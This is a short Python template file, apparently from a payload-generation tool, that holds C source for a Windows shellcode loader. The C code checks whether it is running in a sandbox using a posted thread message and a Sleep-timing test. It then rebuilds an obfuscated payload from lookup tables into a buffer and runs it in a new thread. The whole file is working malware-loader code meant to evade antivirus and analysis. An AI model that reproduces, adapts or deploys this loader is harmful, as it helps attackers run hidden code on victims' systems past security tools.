###"Technical principle: "
from templates.template import *


class template(ITemplate):
    @staticmethod
    def get():
        c_code = '''
#include<windows.h>
#include<stdio.h>

<TABLES>
int main(){

    MSG msg;
    DWORD tc;
    PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
    if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
                return 0;

    if (msg.message != WM_USER+2 || msg.wParam != 23 || msg.lParam != 42)
    return 0;
    tc = GetTickCount();
    Sleep(650);

    if (((GetTickCount() - tc) / 300) != 2)
        return 0;

	PCHAR lpBuffer = <ALLOC>
	for (int i = 0; i < sizeof(offset_table)/sizeof(DWORD); i++)
	{
		lpBuffer[i] = random_dict_table[offset_table[i]];
	}
    
	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, NULL, NULL);
	WaitForSingleObject(hThread, INFINITE);
}    

'''
        return c_code

